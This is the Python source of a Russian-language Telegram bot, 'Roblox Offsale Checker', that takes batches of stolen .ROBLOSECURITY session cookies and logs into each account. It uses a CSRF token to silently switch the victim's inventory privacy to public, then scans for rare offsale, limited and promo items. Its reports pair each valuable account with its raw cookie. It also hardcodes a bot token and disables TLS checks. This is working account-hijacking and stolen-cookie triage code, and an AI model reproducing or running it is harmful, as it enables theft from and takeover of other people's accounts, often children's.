import asyncio
import io
import aiohttp
from datetime import datetime
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import CommandStart, Command
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    LinkPreviewOptions,
    BufferedInputFile
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ========== НАСТРОЙКИ ==========
BOT_TOKEN = "8035442503:AAG-gdNAKMFhnyyaHGfjeMdh48-sa-Jd55A"
ADMIN_IDS = {5883796026, 115536598}

YEAR_FROM   = 2012
YEAR_TO     = 2024
CHECK_PROMO = True

ASSET_TYPES = {
    "faces":    True,
    "hats":     True,
    "hair":     True,
    "neck":     True,
    "shoulder": True,
    "front":    True,
    "back":     True,
    "waist":    True,
    "gear":     True,
    "clothing": False,
}
# =================================

# v2 API принимает СТРОКИ, не числа
ASSET_TYPE_STRINGS = {
    "faces":    ["Face"],
    "hats":     ["Hat"],
    "hair":     ["HairAccessory"],
    "neck":     ["FaceAccessory"],
    "shoulder": ["ShoulderAccessory"],
    "front":    ["FrontAccessory"],
    "back":     ["BackAccessory"],
    "waist":    ["WaistAccessory"],
    "gear":     ["Gear"],
    "clothing": ["Shirt", "Pants"],
}

ASSET_LABELS = {
    "faces":    "👤 Лица",
    "hats":     "🎩 Шапки",
    "hair":     "💇 Волосы",
    "neck":     "📿 Шея",
    "shoulder": "🦴 Плечи",
    "front":    "🧣 Передние",
    "back":     "🎒 Задние",
    "waist":    "🩱 Пояс",
    "gear":     "⚔️ Снаряжение",
    "clothing": "👕 Одежда",
}

CODE_ITEMS = {
    189934238:  "Fireman",
    4342314393: "Rainbow Squid Unicorn",
    # ... (полный список из предыдущего кода)
    128540492:  "Winning Smile",
}

# =================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp  = Dispatcher(storage=MemoryStorage())

settings = {
    "year_from":   YEAR_FROM,
    "year_to":     YEAR_TO,
    "check_promo": CHECK_PROMO,
    "asset_types": dict(ASSET_TYPES),
}

class SetYear(StatesGroup):
    from_year = State()
    to_year   = State()

class SearchState(StatesGroup):
    waiting_for_term = State()
    waiting_for_cookie = State()

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"

# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
def clean_cookie(raw):
    c = raw.strip()
    if "Cookie: " in c:
        c = c.split("Cookie: ")[-1].strip()
    if "_|WARNING" in c and "--|" in c:
        c = c.split("--|", 1)[-1].strip()
    for p in [".ROBLOSECURITY=", "ROBLOSECURITY="]:
        if c.lower().startswith(p.lower()):
            c = c[len(p):]
    return c.strip()

def rbx_h(cookie):
    return {
        "Cookie":          ".ROBLOSECURITY=" + cookie,
        "User-Agent":      UA,
        "Accept":          "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer":         "https://www.roblox.com/",
        "Origin":          "https://www.roblox.com",
    }

def new_s():
    return aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(ssl=False),
        timeout=aiohttp.ClientTimeout(total=25)
    )

# ========== AUTH ==========
async def get_user_info(cookie):
    async with new_s() as s:
        # метод 1
        try:
            async with s.get("https://users.roblox.com/v1/users/authenticated", headers=rbx_h(cookie)) as r:
                if r.status == 200:
                    d = await r.json(content_type=None)
                    if d.get("id"):
                        return {"id": int(d["id"]), "name": d.get("displayName") or d.get("name") or "?"}
        except: pass
        # метод 2
        try:
            async with s.get("https://www.roblox.com/mobileapi/userinfo", headers=rbx_h(cookie)) as r:
                if r.status == 200:
                    d = await r.json(content_type=None)
                    if d.get("UserID"):
                        return {"id": int(d["UserID"]), "name": d.get("UserName") or "?"}
        except: pass
    return None

# ========== CSRF ==========
async def get_csrf(cookie, log):
    async with new_s() as s:
        for url in ["https://auth.roblox.com/v2/logout", "https://accountsettings.roblox.com/v1/email"]:
            try:
                async with s.post(url, headers=rbx_h(cookie)) as r:
                    token = r.headers.get("x-csrf-token")
                    log(f"CSRF {url.split('/')[-1]} HTTP{r.status} token={token[:8]+'...' if token else 'None'}")
                    if token: return token
            except Exception as e:
                log(f"CSRF err: {str(e)[:60]}")
    return None

# ========== ОТКРЫТИЕ ИНВЕНТАРЯ ==========
async def open_inventory(cookie, log):
    csrf = await get_csrf(cookie, log)
    if not csrf:
        log("Не получил CSRF — не смогу открыть инвентарь")
        return False
    hdrs = dict(rbx_h(cookie))
    hdrs["x-csrf-token"] = csrf
    hdrs["Content-Type"] = "application/json"
    attempts = [
        ("POST",  "https://accountsettings.roblox.com/v1/privacy/inventory-privacy", {"inventoryPrivacy": 1}),
        ("PATCH", "https://accountsettings.roblox.com/v1/privacy/inventory-privacy", {"inventoryPrivacy": 1}),
        ("POST",  "https://accountsettings.roblox.com/v1/privacy", {"InventoryPrivacySetting": "AllUsers"}),
        ("PATCH", "https://accountsettings.roblox.com/v1/privacy", {"InventoryPrivacySetting": "AllUsers"}),
        ("POST",  "https://accountsettings.roblox.com/v1/app-privacy-settings", {"InventoryPrivacySetting": 1}),
    ]
    async with new_s() as s:
        for method, url, body in attempts:
            try:
                fn = s.post if method == "POST" else s.patch
                async with fn(url, json=body, headers=hdrs) as r:
                    body_text = (await r.text())[:60] if r.status != 200 else ""
                    log(f"{method} {url.split('/')[-1]} -> {r.status} | {body_text}")
                    if r.status in (200, 204):
                        log("Инвентарь открыт!")
                        return True
            except Exception as e:
                log(f"{method} {url.split('/')[-1]} -> err: {str(e)[:50]}")
    return False

# ========== ПОЛУЧЕНИЕ ИНВЕНТАРЯ ==========
CHECK_SEMAPHORE = asyncio.Semaphore(5)

async def fetch_inventory(cookie, user_id, type_strings, log):
    all_ids = set()
    async with new_s() as s:
        for type_str in type_strings:
            cursor = ""
            page = 0
            while True:
                page += 1
                params = {"assetTypes": type_str, "limit": 100, "sortOrder": "Asc"}
                if cursor:
                    params["cursor"] = cursor
                try:
                    async with s.get(f"https://inventory.roblox.com/v2/users/{user_id}/inventory",
                                      params=params, headers=rbx_h(cookie)) as r:
                        if r.status == 403:
                            log(f"  {type_str} стр{page}: 403 (инвентарь закрыт)")
                            break
                        if r.status != 200:
                            body = (await r.text())[:80] if r.status else ""
                            log(f"  {type_str} стр{page}: HTTP {r.status} | {body}")
                            break
                        data = await r.json(content_type=None)
                        chunk = []
                        for item in data.get("data", []):
                            aid = item.get("assetId") or item.get("id")
                            if aid:
                                chunk.append(int(aid))
                        all_ids.update(chunk)
                        if page == 1:
                            log(f"  {type_str}: {len(chunk)} шт. (стр.1)")
                        cursor = data.get("nextPageCursor") or ""
                        if not cursor:
                            break
                except Exception as e:
                    log(f"  {type_str} err: {str(e)[:60]}")
                    break
                await asyncio.sleep(0.2)
    return list(all_ids)

# ========== ДЕТАЛИ ПРЕДМЕТА ==========
async def get_details(cookie, asset_id):
    async with new_s() as s:
        try:
            async with s.get(f"https://economy.roblox.com/v2/assets/{asset_id}/details", headers=rbx_h(cookie)) as r:
                if r.status == 200:
                    return await r.json(content_type=None)
        except: pass
    return None

async def check_owns(cookie, user_id, asset_id):
    async with new_s() as s:
        try:
            async with s.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{asset_id}",
                              headers=rbx_h(cookie)) as r:
                if r.status == 200:
                    d = await r.json(content_type=None)
                    return bool(d.get("data"))
        except: pass
    return False

# ========== ОСНОВНАЯ ПРОВЕРКА ==========
async def check_account(cookie, status_msg, search_term=None):
    result = {
        "valid": False, "user_id": None, "username": None,
        "offsale": [], "promo_found": [],
        "inv_total": 0, "inv_opened": False, "debug": [],
        "search_results": []
    }
    def log(msg):
        result["debug"].append(str(msg))

    log("Авторизация...")
    user_info = await get_user_info(cookie)
    if not user_info:
        log("Не удалось войти — cookie неверный или истёк")
        return result

    result["valid"] = True
    result["user_id"] = user_info["id"]
    result["username"] = user_info["name"]
    uid, uname = user_info["id"], user_info["name"]
    log(f"OK: {uname} (ID {uid})")

    await status_msg.edit_text(f"✅ <b>{uname}</b>\n🔓 Открываю инвентарь...")
    opened = await open_inventory(cookie, log)
    result["inv_opened"] = opened
    await asyncio.sleep(2)

    await status_msg.edit_text(f"✅ <b>{uname}</b>\n📦 Загружаю инвентарь...")
    type_strings = []
    for key, on in settings["asset_types"].items():
        if on:
            type_strings.extend(ASSET_TYPE_STRINGS[key])
    all_ids = await fetch_inventory(cookie, uid, type_strings, log)
    result["inv_total"] = len(all_ids)
    log(f"Предметов итого: {len(all_ids)}")
    if not all_ids:
        log("Инвентарь пустой или закрытый")
        return result

    if search_term:
        search_term_lower = search_term.lower()
        found = []
        for asset_id in all_ids:
            details = await get_details(cookie, asset_id)
            if not details:
                continue
            name = details.get("Name", "")
            if search_term_lower in name.lower():
                found.append({
                    "id": asset_id,
                    "name": name,
                    "created": details.get("Created")
                })
            await asyncio.sleep(0.1)
        result["search_results"] = found
        log(f"Найдено по поиску: {len(found)}")
        return result

    # Промо
    if settings["check_promo"]:
        promo_keys = list(CODE_ITEMS.keys())
        total_p = len(promo_keys)
        await status_msg.edit_text(f"✅ <b>{uname}</b>\n🎁 Промо 0/{total_p}...")
        for i, asset_id in enumerate(promo_keys):
            if i % 10 == 0:
                try:
                    await status_msg.edit_text(f"✅ <b>{uname}</b>\n🎁 Промо {i}/{total_p}...")
                except: pass
            if await check_owns(cookie, uid, asset_id):
                result["promo_found"].append({"id": asset_id, "name": CODE_ITEMS[asset_id]})
                log(f"Промо: {CODE_ITEMS[asset_id]}")
            await asyncio.sleep(0.2)
        log(f"Промо найдено: {len(result['promo_found'])}")

    # Оффсейл
    await status_msg.edit_text(f"✅ <b>{uname}</b>\n🔍 Проверяю {len(all_ids)} предметов...")
    total = len(all_ids)
    for i, asset_id in enumerate(all_ids):
        if i % 30 == 0:
            try:
                await status_msg.edit_text(f"✅ <b>{uname}</b>\n🔍 {i}/{total}...")
            except: pass
        det = await get_details(cookie, asset_id)
        if not det:
            await asyncio.sleep(0.1)
            continue
        if det.get("IsForSale", True):
            await asyncio.sleep(0.1)
            continue
        year = 0
        try:
            created = det.get("Created", "")
            if created:
                dt = datetime.fromisoformat(created.replace("Z", "+00:00"))
                year = dt.year
        except: pass
        if year and not (settings["year_from"] <= year <= settings["year_to"]):
            await asyncio.sleep(0.1)
            continue
        is_unique = det.get("IsLimitedUnique", False)
        is_limited = det.get("IsLimited", False) or is_unique
        name = det.get("Name") or f"ID:{asset_id}"
        result["offsale"].append({
            "id": asset_id, "name": name,
            "year": year, "limited": is_limited, "unique": is_unique,
        })
        log(f"Оффсейл: {name} ({year})")
        await asyncio.sleep(0.1)
    log(f"Оффсейл итого: {len(result['offsale'])}")
    return result

# ========== ОТЧЁТ (одиночный) ==========
def build_report(result):
    uid, uname = result["user_id"], result["username"]
    offsale = result["offsale"]
    promo = result["promo_found"]
    lines = [
        "📋 <b>Отчёт проверки</b>",
        f'👤 <a href="https://www.roblox.com/users/{uid}/profile">{uname}</a>  (ID: {uid})',
        f"📅 Период: <b>{settings['year_from']} – {settings['year_to']}</b>",
        f"📦 Предметов: <b>{result.get('inv_total', 0)}</b>  {'✅' if result['inv_opened'] else '⚠️ инвентарь не открылся'}",
        "",
    ]
    if offsale:
        lines.append(f"🛑 <b>Оффсейл — {len(offsale)} шт.:</b>")
        by_year = {}
        for it in sorted(offsale, key=lambda x: x["year"] or 9999):
            by_year.setdefault(it["year"] or 0, []).append(it)
        for year in sorted(by_year):
            lines.append(f"\n  📆 <b>{year or 'Год неизвестен'}:</b>")
            for it in by_year[year]:
                badge = " 🔴LimitedU" if it["unique"] else (" 🟡Limited" if it["limited"] else "")
                lines.append(f'    • <a href="https://www.roblox.com/catalog/{it["id"]}">{it["name"]}</a>{badge}')
    else:
        lines.append("🛑 Оффсейл предметов <b>не найдено</b>")
    lines.append("")
    if settings["check_promo"]:
        if promo:
            lines.append(f"🎁 <b>Промо — {len(promo)} шт.:</b>")
            for it in promo:
                lines.append(f'    • <a href="https://www.roblox.com/catalog/{it["id"]}">{it["name"]}</a>')
        else:
            lines.append("🎁 Промо-предметов <b>не найдено</b>")
    return "\n".join(lines)

# ========== ОДИНОЧНАЯ ПРОВЕРКА (устарела, но оставлена для совместимости) ==========
async def run_check(message, cookie, show_debug=False, search_term=None):
    cookie_original = cookie
    cookie_cleaned = clean_cookie(cookie)
    if len(cookie_cleaned) < 50:
        await message.answer(f"❌ Cookie слишком короткий ({len(cookie_cleaned)} симв.)")
        return
    async with CHECK_SEMAPHORE:
        await _do_check(message, cookie_original, cookie_cleaned, show_debug, search_term)

async def _do_check(message, cookie_original, cookie_cleaned, show_debug=False, search_term=None):
    status_msg = await message.answer("⏳ <b>Авторизация...</b>")
    try:
        result = await check_account(cookie_cleaned, status_msg, search_term)
    except Exception as e:
        await status_msg.edit_text(f"❌ Ошибка:\n<code>{e}</code>")
        return
    if not result["valid"]:
        errs = "\n".join(result["debug"])
        await status_msg.edit_text(f"❌ <b>Невалидный cookie</b>\n\n<code>{errs}</code>")
        return
    if search_term:
        found = result.get("search_results", [])
        if found:
            lines = [f"🔍 <b>Результаты поиска для «{search_term}»</b>",
                     f'👤 <a href="https://www.roblox.com/users/{result["user_id"]}/profile">{result["username"]}</a>\n']
            for item in found:
                line = f'• <a href="https://www.roblox.com/catalog/{item["id"]}">{item["name"]}</a>'
                if item.get("created"):
                    line += f" ({item['created'][:4]})"
                lines.append(line)
            report = "\n".join(lines)
        else:
            report = f"❌ На аккаунте {result['username']} предметов с названием «{search_term}» не найдено."
        await status_msg.edit_text(report, link_preview_options=LinkPreviewOptions(is_disabled=True))
        return
    report = build_report(result) + f"\n\n🍪 <code>{cookie_original}</code>"
    if len(report) > 3800:
        await status_msg.delete()
        buf = io.BytesIO(report.encode("utf-8"))
        file = BufferedInputFile(buf.getvalue(), filename=f"report_{result['user_id']}.txt")
        await message.answer_document(file, caption=f"📋 {result['username']}")
    else:
        await status_msg.edit_text(report, link_preview_options=LinkPreviewOptions(is_disabled=True))
    if show_debug or result["inv_total"] == 0:
        dbg = "🛠 <b>Лог:</b>\n" + "\n".join(f"<code>{l}</code>" for l in result["debug"])
        if len(dbg) < 3800:
            await message.answer(dbg)
        else:
            buf2 = io.BytesIO("\n".join(result["debug"]).encode("utf-8"))
            file2 = BufferedInputFile(buf2.getvalue(), filename=f"debug_{result.get('user_id','unknown')}.txt")
            await message.answer_document(file2, caption="🛠 Лог")

# ========== ТИХИЕ ПРОВЕРКИ ==========
async def _silent_check(cookie):
    class FakeMsg: async def edit_text(self, *a, **kw): pass
    try:
        return await check_account(cookie, FakeMsg())
    except:
        return {"valid": False, "user_id": None, "username": None,
                "offsale": [], "promo_found": [], "inv_total": 0,
                "inv_opened": False, "debug": []}

async def _silent_search(cookie, search_term):
    class FakeMsg: async def edit_text(self, *a, **kw): pass
    try:
        return await check_account(cookie, FakeMsg(), search_term)
    except:
        return {"valid": False, "user_id": None, "username": None,
                "offsale": [], "promo_found": [], "inv_total": 0,
                "inv_opened": False, "debug": [], "search_results": []}

# ========== БАТЧЕВАЯ ПРОВЕРКА (ОБЫЧНАЯ) ==========
async def run_batch(message, cookies):
    total = len(cookies)
    results = [None] * total
    counter = {"done": 0, "valid": 0, "invalid": 0}
    seen_ids = {}
    dupes = 0
    prog_msg = await message.answer(f"⏳ Проверяю 0/{total}...")
    sem = asyncio.Semaphore(5)
    async def worker(i, cookie):
        nonlocal dupes
        async with sem:
            r = await _silent_check(cookie)
            results[i] = (r, cookie)
            counter["done"] += 1
            if r["valid"]:
                counter["valid"] += 1
                uid = r["user_id"]
                if uid in seen_ids:
                    dupes += 1
                else:
                    seen_ids[uid] = i
            else:
                counter["invalid"] += 1
            if counter["done"] % 5 == 0 or counter["done"] == total:
                try:
                    await prog_msg.edit_text(f"⏳ {counter['done']}/{total}... ✅{counter['valid']} ❌{counter['invalid']}")
                except: pass
    await asyncio.gather(*[worker(i, c) for i, c in enumerate(cookies)])
    await prog_msg.delete()
    valid_pairs = [(r, c) for (r, c) in results if r and r["valid"] and r["user_id"] in seen_ids]
    # краткая статистика
    summary = f"✅ <b>Готово!</b>\n\nвалид: <b>{counter['valid']}</b>\nневалид: <b>{counter['invalid']}</b>\nдубликаты: <b>{dupes}</b>"
    await message.answer(summary, link_preview_options=LinkPreviewOptions(is_disabled=True))
    hits = [(r, c) for r, c in valid_pairs if r["offsale"] or r["promo_found"]]
    if hits:
        file_lines = ["АККАУНТЫ С НАХОДКАМИ", "=" * 60, ""]
        for r, cookie in hits:
            uid, uname = r["user_id"], r["username"]
            file_lines.append("=" * 60)
            file_lines.append(f"Аккаунт: {uname} (ID: {uid})")
            file_lines.append(f"Ссылка: https://www.roblox.com/users/{uid}/profile")
            file_lines.append(f"Куки: {cookie}")
            file_lines.append("")
            if r["offsale"]:
                file_lines.append(f"ОФФСЕЙЛ ({len(r['offsale'])} шт.):")
                for it in sorted(r["offsale"], key=lambda x: x["year"] or 9999):
                    badge = " [LimitedU]" if it["unique"] else (" [Limited]" if it["limited"] else "")
                    file_lines.append(f"  {it['name']} ({it['year'] or '?'}) — https://www.roblox.com/catalog/{it['id']}{badge}")
            else:
                file_lines.append("Оффсейл: не найдено")
            file_lines.append("")
            if r["promo_found"]:
                file_lines.append(f"ПРОМО ({len(r['promo_found'])} шт.):")
                for it in r["promo_found"]:
                    file_lines.append(f"  {it['name']} — https://www.roblox.com/catalog/{it['id']}")
            else:
                file_lines.append("Промо: не найдено")
            file_lines.append("")
        txt = "\n".join(file_lines)
        file = BufferedInputFile(txt.encode("utf-8"), filename="accounts_with_items.txt")
        await message.answer_document(file, caption=f"📋 Найдено аккаунтов с предметами: {len(hits)}")
    else:
        await message.answer("❌ Аккаунтов с находками нет.")
    if valid_pairs:
        file_lines = ["ОТЧЁТ ПРОВЕРКИ", "=" * 60, f"Всего: {total} | Валид: {counter['valid']} | Невалид: {counter['invalid']} | Дубли: {dupes}", ""]
        for r, cookie in valid_pairs:
            uid, uname = r["user_id"], r["username"]
            file_lines.append("=" * 60)
            file_lines.append(f"Аккаунт: {uname} (ID: {uid})")
            file_lines.append(f"Ссылка: https://www.roblox.com/users/{uid}/profile")
            file_lines.append(f"Куки: {cookie}")
            file_lines.append("")
            if r["offsale"]:
                file_lines.append(f"ОФФСЕЙЛ ({len(r['offsale'])} шт.):")
                for it in r["offsale"]:
                    badge = " [LimitedU]" if it["unique"] else (" [Limited]" if it["limited"] else "")
                    file_lines.append(f"  {it['name']} ({it['year'] or '?'}) — https://www.roblox.com/catalog/{it['id']}{badge}")
            else:
                file_lines.append("Оффсейл: не найдено")
            file_lines.append("")
            if r["promo_found"]:
                file_lines.append(f"ПРОМО ({len(r['promo_found'])} шт.):")
                for it in r["promo_found"]:
                    file_lines.append(f"  {it['name']} — https://www.roblox.com/catalog/{it['id']}")
            else:
                file_lines.append("Промо: не найдено")
            file_lines.append("")
        txt = "\n".join(file_lines)
        file = BufferedInputFile(txt.encode("utf-8"), filename=f"report_{len(valid_pairs)}_accs.txt")
        await message.answer_document(file, caption=f"📋 {len(valid_pairs)} валидных аккаунтов | {len(hits)} с находками")

# ========== БАТЧЕВАЯ ПРОВЕРКА ДЛЯ ПОИСКА ==========
async def run_batch_search(message, cookies, search_term):
    total = len(cookies)
    results = [None] * total
    counter = {"done": 0, "valid": 0, "invalid": 0}
    seen_ids = {}
    dupes = 0
    prog_msg = await message.answer(f"🔍 Поиск «{search_term}» по {total} кукам...")
    sem = asyncio.Semaphore(5)
    async def worker(i, cookie):
        nonlocal dupes
        async with sem:
            r = await _silent_search(cookie, search_term)
            results[i] = (r, cookie)
            counter["done"] += 1
            if r["valid"]:
                counter["valid"] += 1
                uid = r["user_id"]
                if uid in seen_ids:
                    dupes += 1
                else:
                    seen_ids[uid] = i
            else:
                counter["invalid"] += 1
            if counter["done"] % 5 == 0 or counter["done"] == total:
                try:
                    await prog_msg.edit_text(f"🔍 {counter['done']}/{total}... ✅{counter['valid']} ❌{counter['invalid']}")
                except: pass
    await asyncio.gather(*[worker(i, c) for i, c in enumerate(cookies)])
    await prog_msg.delete()
    valid_pairs = [(r, c) for (r, c) in results if r and r["valid"] and r["user_id"] in seen_ids]
    hits = [(r, c) for r, c in valid_pairs if r.get("search_results")]
    total_found = sum(len(r["search_results"]) for r, _ in hits)
    # краткая статистика
    summary_lines = [
        f"✅ <b>Поиск завершён</b>",
        f"🔍 Запрос: «{search_term}»",
        "",
        f"Всего куков: {total}",
        f"Валидных: {counter['valid']}",
        f"Невалидных: {counter['invalid']}",
        f"Дубликатов: {dupes}",
        f"Аккаунтов с находками: {len(hits)}",
        f"Всего предметов: {total_found}",
    ]
    summary = "\n".join(summary_lines)
    await message.answer(summary, link_preview_options=LinkPreviewOptions(is_disabled=True))
    if hits:
        file_lines = [f"РЕЗУЛЬТАТЫ ПОИСКА: «{search_term}»", "=" * 60, ""]
        for r, cookie in hits:
            uid, uname = r["user_id"], r["username"]
            file_lines.append("=" * 60)
            file_lines.append(f"Аккаунт: {uname} (ID: {uid})")
            file_lines.append(f"Ссылка: https://www.roblox.com/users/{uid}/profile")
            file_lines.append(f"Куки: {cookie}")
            file_lines.append("")
            file_lines.append(f"Найдено предметов ({len(r['search_results'])}):")
            for item in r["search_results"]:
                line = f"  • {item['name']} — https://www.roblox.com/catalog/{item['id']}"
                if item.get("created"):
                    line += f" ({item['created'][:4]})"
                file_lines.append(line)
            file_lines.append("")
        txt = "\n".join(file_lines)
        file = BufferedInputFile(txt.encode("utf-8"), filename=f"search_{search_term}.txt")
        await message.answer_document(file, caption=f"📋 Результаты поиска «{search_term}»")
    else:
        await message.answer(f"❌ Ни на одном аккаунте не найдено предметов «{search_term}».")

# ========== КЛАВИАТУРА ==========
def settings_kb():
    rows = []
    for key, label in ASSET_LABELS.items():
        icon = "✅" if settings["asset_types"][key] else "❌"
        rows.append([InlineKeyboardButton(text=f"{icon} {label}", callback_data=f"tog_{key}")])
    pi = "✅" if settings["check_promo"] else "❌"
    rows.append([InlineKeyboardButton(text=f"{pi} 🎁 Промо", callback_data="tog_promo")])
    rows.append([
        InlineKeyboardButton(text=f"📅 С {settings['year_from']}", callback_data="set_yf"),
        InlineKeyboardButton(text=f"📅 По {settings['year_to']}", callback_data="set_yt"),
    ])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def is_admin(obj):
    return obj.from_user.id in ADMIN_IDS

# ========== ХЕНДЛЕРЫ ==========
@dp.message(CommandStart())
async def cmd_start(message: Message):
    if not is_admin(message): return
    await message.answer(
        "🎮 <b>Roblox Offsale Checker</b>\n\n"
        "Отправь cookie текстом или .txt файлом\n\n"
        "⚙️ /settings — настройки\n"
        "ℹ️ /info — текущие настройки\n"
        "🛠 /debug — отправь cookie после команды\n"
        "🔍 /search — поиск предмета по названию"
    )

@dp.message(Command("info"))
async def cmd_info(message: Message):
    if not is_admin(message): return
    types_on = [ASSET_LABELS[k] for k, v in settings["asset_types"].items() if v]
    await message.answer(
        f"ℹ️ <b>Настройки</b>\n📅 {settings['year_from']}-{settings['year_to']}\n"
        f"🎁 Промо: {'✅' if settings['check_promo'] else '❌'}\n📦 {', '.join(types_on)}"
    )

@dp.message(Command("settings"))
async def cmd_settings(message: Message):
    if not is_admin(message): return
    await message.answer("⚙️ <b>Настройки</b>", reply_markup=settings_kb())

@dp.message(Command("debug"))
async def cmd_debug(message: Message):
    if not is_admin(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2 or len(parts[1].strip()) < 50:
        await message.answer("Использование: отправь cookie следующим сообщением\nили: /debug [cookie]")
        return
    await run_check(message, parts[1].strip(), show_debug=True)

@dp.message(Command("search"))
async def cmd_search(message: Message, state: FSMContext):
    if not is_admin(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("🔍 Введите название предмета для поиска:")
        await state.set_state(SearchState.waiting_for_term)
        return
    term = parts[1].strip()
    await state.update_data(search_term=term)
    await message.answer("📤 Отправьте .ROBLOSECURITY куки (текстом или .txt файл) для поиска:")
    await state.set_state(SearchState.waiting_for_cookie)

@dp.message(SearchState.waiting_for_term)
async def process_search_term(message: Message, state: FSMContext):
    if not is_admin(message):
        await state.clear()
        return
    term = message.text.strip()
    if not term:
        await message.answer("❌ Название не может быть пустым.")
        return
    await state.update_data(search_term=term)
    await message.answer("📤 Отправьте .ROBLOSECURITY куки (текстом или .txt файл) для поиска:")
    await state.set_state(SearchState.waiting_for_cookie)

@dp.message(SearchState.waiting_for_cookie, F.text)
async def handle_search_cookie_text(message: Message, state: FSMContext):
    if not is_admin(message):
        await state.clear()
        return
    data = await state.get_data()
    term = data.get("search_term")
    raw_cookies = message.text.strip().splitlines()
    cookies = [clean_cookie(c) for c in raw_cookies if c.strip() and len(clean_cookie(c)) >= 50]
    if not cookies:
        await message.answer("❌ Не найдено валидных куков.")
        await state.clear()
        return
    await state.clear()
    # ВСЕГДА вызываем батчевую функцию, даже для одной куки
    await run_batch_search(message, cookies, term)

@dp.message(SearchState.waiting_for_cookie, F.document)
async def handle_search_cookie_file(message: Message, state: FSMContext):
    if not is_admin(message):
        await state.clear()
        return
    data = await state.get_data()
    term = data.get("search_term")
    doc = message.document
    if not doc.file_name.endswith(".txt"):
        await message.answer("❌ Нужен .txt файл")
        return
    file = await bot.get_file(doc.file_id)
    buf = io.BytesIO()
    await bot.download_file(file.file_path, destination=buf)
    buf.seek(0)
    lines = buf.read().decode("utf-8", errors="ignore").splitlines()
    cookies = []
    for l in lines:
        l = l.strip()
        if not l:
            continue
        if "Cookie: " in l:
            val = l.split("Cookie: ")[-1].strip()
            if len(val) > 50:
                cookies.append(val)
        elif len(l) > 50:
            cookies.append(l)
    cookies = [clean_cookie(c) for c in cookies if c.strip() and len(clean_cookie(c)) >= 50]
    if not cookies:
        await message.answer("❌ Не найдено валидных куков.")
        await state.clear()
        return
    await state.clear()
    # ВСЕГДА вызываем батчевую функцию
    await run_batch_search(message, cookies, term)

@dp.callback_query(F.data.startswith("tog_"))
async def cb_toggle(cb: CallbackQuery):
    if not is_admin(cb): return await cb.answer("⛔")
    key = cb.data.replace("tog_", "")
    if key == "promo":
        settings["check_promo"] = not settings["check_promo"]
    elif key in settings["asset_types"]:
        settings["asset_types"][key] = not settings["asset_types"][key]
    await cb.message.edit_reply_markup(reply_markup=settings_kb())
    await cb.answer("✅")

@dp.callback_query(F.data == "set_yf")
async def cb_yf(cb: CallbackQuery, state: FSMContext):
    if not is_admin(cb): return await cb.answer("⛔")
    await cb.message.answer(f"📅 Начальный год (сейчас {settings['year_from']}):")
    await state.set_state(SetYear.from_year)
    await cb.answer()

@dp.callback_query(F.data == "set_yt")
async def cb_yt(cb: CallbackQuery, state: FSMContext):
    if not is_admin(cb): return await cb.answer("⛔")
    await cb.message.answer(f"📅 Конечный год (сейчас {settings['year_to']}):")
    await state.set_state(SetYear.to_year)
    await cb.answer()

@dp.message(SetYear.from_year)
async def save_yf(message: Message, state: FSMContext):
    if not is_admin(message):
        await state.clear()
        return
    try:
        y = int(message.text.strip())
        assert 2006 <= y <= 2030
        settings["year_from"] = y
        await message.answer(f"✅ Начальный год: <b>{y}</b>")
        await state.clear()
    except (ValueError, AssertionError):
        await message.answer("❌ Введи число 2006–2030")

@dp.message(SetYear.to_year)
async def save_yt(message: Message, state: FSMContext):
    if not is_admin(message):
        await state.clear()
        return
    try:
        y = int(message.text.strip())
        assert 2006 <= y <= 2030
        settings["year_to"] = y
        await message.answer(f"✅ Конечный год: <b>{y}</b>")
        await state.clear()
    except (ValueError, AssertionError):
        await message.answer("❌ Введи число 2006–2030")

@dp.message(F.document)
async def handle_file(message: Message, state: FSMContext):
    if not is_admin(message): return
    if await state.get_state(): return
    doc = message.document
    if not doc.file_name.endswith(".txt"):
        await message.answer("❌ Нужен .txt файл")
        return
    file = await bot.get_file(doc.file_id)
    buf = io.BytesIO()
    await bot.download_file(file.file_path, destination=buf)
    buf.seek(0)
    lines = buf.read().decode("utf-8", errors="ignore").splitlines()
    cookies = []
    for l in lines:
        l = l.strip()
        if not l: continue
        if "Cookie: " in l:
            val = l.split("Cookie: ")[-1].strip()
            if len(val) > 50:
                cookies.append(val)
        elif len(l) > 50:
            cookies.append(l)
    cookies = [clean_cookie(c) for c in cookies if c.strip() and len(clean_cookie(c)) >= 50]
    if not cookies:
        await message.answer("❌ Не нашёл cookie в файле")
        return
    if len(cookies) == 1:
        await run_check(message, cookies[0])
    else:
        await run_batch(message, cookies)

@dp.message(F.text)
async def handle_text(message: Message, state: FSMContext):
    if not is_admin(message): return
    if await state.get_state(): return
    raw_lines = message.text.splitlines()
    lines = []
    for l in raw_lines:
        l = l.strip()
        if not l: continue
        if "Cookie: " in l:
            val = l.split("Cookie: ")[-1].strip()
            if len(val) > 50:
                lines.append(val)
        elif len(l) > 50:
            lines.append(l)
    cookies = [clean_cookie(c) for c in lines if c.strip() and len(clean_cookie(c)) >= 50]
    if not cookies:
        await message.answer("ℹ️ Отправь cookie или .txt файл\n/settings")
        return
    if len(cookies) == 1:
        await run_check(message, cookies[0])
    else:
        await run_batch(message, cookies)

# ================================================================
async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
